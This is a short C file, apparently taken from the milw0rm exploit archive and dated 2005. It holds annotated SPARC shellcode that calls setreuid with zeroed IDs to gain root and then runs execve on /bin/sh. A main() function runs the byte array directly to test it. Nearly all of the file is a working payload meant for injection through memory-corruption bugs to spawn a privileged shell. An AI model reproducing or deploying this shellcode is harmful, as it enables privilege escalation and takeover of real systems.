/*
 * lhall@telegenetic.net
 * setreuid shellcode
 * full description of how it was done and defines at
 * http://www.telegenetic.net/sparc-shellcode.htm
 */

char shellcode[] =
"\x90\x1A\x40\x09"  /* xor %o1, %o1, %o0          */
"\x92\x1A\x40\x09"  /* xor %o1, %o1, %o1          */
"\x82\x10\x20\xCA"  /* mov SYS_SETREUID(202), %g1 */
"\x91\xD0\x20\x08"  /* ta KERNEL(0x08)            */
"\x21\x0B\xD8\x9A"  /* sethi %hi(0x2f626900), %l0 */
"\xA0\x14\x21\x6E"  /* or %l0, %lo(0x16e), %l0    */
"\x23\x0B\xDC\xDA"  /* sethi %hi(0x2f736800), %l1 */
"\xE0\x3B\xBF\xF0"  /* std %l0, [%sp - 0x10]      */
"\x90\x23\xA0\x10"  /* sub %sp, 0x10, %o0         */
"\xD0\x23\xBF\xF8"  /* st  %o0, [%sp - 0x8]       */
"\x92\x23\xA0\x08"  /* sub %sp, 0x8, %o1          */
"\x94\x1A\x80\x0A"  /* xor %o2, %o2, %o2          */
"\x82\x10\x20\x3B"  /* mov SYS_EXECVE(59), %g1    */
"\x91\xD0\x20\x08"; /* ta KERNEL(0x08)            */

int
main (int argc, char **argv)
{
       int (*ret)();
       ret = (int(*)())shellcode;
       (int)(*ret)();
       exit(0);
}

// milw0rm.com [2005-11-20]